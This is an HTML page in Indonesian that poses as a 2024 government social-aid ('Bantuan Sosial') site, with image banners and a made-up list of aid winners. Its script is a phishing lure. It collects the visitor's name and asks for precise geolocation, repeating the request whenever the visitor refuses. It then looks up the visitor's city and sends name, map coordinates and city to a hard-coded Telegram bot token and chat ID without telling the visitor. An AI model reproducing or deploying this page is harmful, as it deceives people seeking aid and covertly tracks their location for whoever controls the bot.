<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bantuan Sosial 2024</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #2196F3, #21CBF3);
            color: white;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        /* Gaya untuk footer */
        footer {
            color: #fff; /* Warna teks */
            text-align:center; /* Rata tengah */
            padding: 0px; /* Ruang di dalam footer */
            position: relative; /* Posisi relatif */
            bottom: 0; /* Menempel di bawah */
            width: 100%; /* Lebar penuh */
        }
                .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%; /* Hitam samar-samar */
            z-index: 999;
            display: none; /* Tersembunyi secara default */
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }

        .alert-box {
            position: fixed;
            top: 20px; /* Posisikan di atas */
            left: 50%;
            transform: translateX(-50%);
            padding: 20px 40px;
            background-color: gray;
            color: #fff;
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            animation: fadeIn 1s ease, fadeOut 2.5s 3s forwards;
        }
        .container {
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        form {
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-top: 10px;
            font-size: 1.2rem;
            display: block;
            margin: 10px auto;
        }
        input[type="submit"] {
            background-color: darkblue;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 1.2rem;
            display: inline-block;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background-color: black;
        }
        .info {
            margin-top: 20px;
            text-align: left;
            font-size: 1.1rem;
        }
        .info p {
            margin: 10px 0;
        }
        .winners {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            max-height: 200px;
            overflow: hidden;
            position: relative;
        }
        .winner-list {
            list-style: none;
            padding: 0;
            margin: 0;
            animation: scroll 50s linear infinite;
        }
        .winner-list li {
            margin: 10px 0;
            font-size: 1.1rem;
        }
        @keyframes scroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(-100%); }
        }

        /* Banner Slider */
        .banner {
            width: 100%;
            max-width: 800px;
            height: 200px;
            overflow: hidden;
            margin: 20px auto;
            position: relative;
            border-radius: 10px;
        }
        .slides {
            display: flex;
            transition: transform 0.5s ease-in-out;
        }
        .slides img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .arrow {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background-color: rgba(0, 0, 0, 0.5);
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 50%;
            z-index: 1000;
        }
        .arrow.left {
            left: 10px;
        }
        .arrow.right {
            right: 10px;
        }
    </style>
</head>
<body>
    <div class="overlay"></div> <!-- Overlay untuk background hitam samar -->
<div class="container">
    <h1>Bantuan Sosial 2024</h1>
    
    <!-- Banner Slider -->
    <div class="banner">
        <button class="arrow left" onclick="changeSlide(-1)">&#10094;</button>
        <div class="slides">
            <img src="https://github.com/bantuan2024/Image/blob/main/images.jpeg?raw=true" alt="Banner 1">
            <img src="https://github.com/bantuan2024/Image/blob/main/images%20(1).jpeg?raw=true" alt="Banner 2">
            <img src="https://github.com/bantuan2024/Image/blob/main/images%20(2).jpeg?raw=true" alt="Banner 3">
        </div>
        <button class="arrow right" onclick="changeSlide(1)">&#10095;</button>
    </div>
    
    <form id="nameForm">
        <label for="nama">Masukkan Nama Anda:</label><br>
        <input type="text" id="nama" name="nama" placeholder="Nama Anda"><br><br>
        <input type="submit" value="Kirim">
    </form>

    <div class="info" id="info">
        <p><strong>Nama: </strong><span id="userName">Belum diisi</span></p>
        <p><strong>Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
        <p><strong> Kota: </strong><span id="userCity">Belum diisi</span></p>
    </div>

    <h2>Pemenang Bantuan Sosial</h2>
    <div class="winners">
        <ul class="winner-list" id="winnerList">
            <!-- Pemenang akan dimasukkan secara otomatis -->
        </ul>
    </div>
</div>
  <footer>
        <p>&copy; BANTUAN SOSIAL - 2024</p>
    </footer>

<script>
        window.onload = function() {
            // Tampilkan overlay
            const overlay = document.querySelector('.overlay');
            overlay.style.display = 'block';

            // Membuat elemen alert box
            const alertBox = document.createElement('div');
            alertBox.className = 'alert-box';
            alertBox.innerText = 'Selamat datang di website kami!';

            // Menambahkan elemen ke body
            document.body.appendChild(alertBox);

            // Menghapus alert setelah animasi selesai
            setTimeout(() => {
                document.body.removeChild(alertBox);
                overlay.style.display = 'none'; // Sembunyikan overlay
            }, 5500); // 5.5 detik untuk mengakomodasi animasi fade out
        };
    let currentSlide = 0;
    const slides = document.querySelector('.slides');
    const totalSlides = document.querySelectorAll('.slides img').length;

    function changeSlide(direction) {
        currentSlide = (currentSlide + direction + totalSlides) % totalSlides;
        slides.style.transform = `translateX(-${currentSlide * 100}%)`;
    }

    const form = document.getElementById('nameForm');
    const userNameSpan = document.getElementById('userName');
    const userLocationSpan = document.getElementById('userLocation');
    const userCitySpan = document.getElementById('userCity');
    let userName = '';
    let userLocation = '';
    let userCity = '';

    const pemenang = [
        { nama: 'Ade Santoso', alamat: 'Jakarta' },
        { nama: 'Budi Prasetyo', alamat: 'Bandung' },
        { nama: 'Citra Maharani', alamat: 'Surabaya' },
        { nama: 'Dewi Lestari', alamat: 'Yogyakarta' },
        { nama: 'Eko Saputra', alamat: 'Semarang' },
        { nama: 'Fajar Nugraha', alamat: 'Malang' },
        { nama: 'Gina Fitriani', alamat: 'Medan' },
        { nama: 'Hadi Wirawan', alamat: 'Bali' },
        { nama: 'Intan Wulandari', alamat: 'Makassar' },
        { nama: 'Joko Subagio', alamat: 'Palembang' }
    ];

    function tampilkanPemenang() {
        const winnerList = document.getElementById('winnerList');
        winnerList.innerHTML = '';
        pemenang.forEach(winner => {
            const li = document.createElement('li');
            li.textContent = `Nama: ${winner.nama}, Alamat: ${winner.alamat}`;
            winnerList.appendChild(li);
        });
    }

    tampilkanPemenang();

    form.addEventListener('submit', (event) => {
        event.preventDefault();
        userName = document.getElementById('nama').value;
        userNameSpan.textContent = userName;
        getLocation();
    });

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, retryLocation, { enableHighAccuracy: true });
        } else {
            userLocationSpan.textContent = "Geolocation tidak didukung oleh browser ini.";
        }
    }

    function retryLocation() {
        getLocation(); // Meminta lokasi lagi jika pengguna menolak
    }

    function showPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        userLocation = `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Lihat di Maps</a>`;
        userLocationSpan.innerHTML = userLocation;

        // Cari kota berdasarkan koordinat
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
            .then(response => response.json())
            .then(data => {
                userCity = data.address.city || data.address.town || 'Kota tidak ditemukan';
                userCitySpan.textContent = userCity;

                // Kirim data ke bot Telegram
                sendToTelegram();
            })
            .catch(error => {
                console.error('Error mendapatkan kota:', error);
                userCitySpan.textContent = 'Kota tidak ditemukan';
            });
    }

    function sendToTelegram() {
        const botToken = '7389363622:AAH_nazG_ng1n7Vv92a0xBxnvx6WQRqj6cg'; // Token disamarkan
        const chatId = '6864784021'; // Chat ID
        const message = `👤 Nama: ${userName}\n📍 Lokasi: ${userLocation}\n🏙️ Kota: ${userCity}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('data anda sedang kami proses!', data);
        })
        .catch(error => {
            console.error('Silahkan muat ulang :', error);
        });
    }
</script>

</body>
</html>
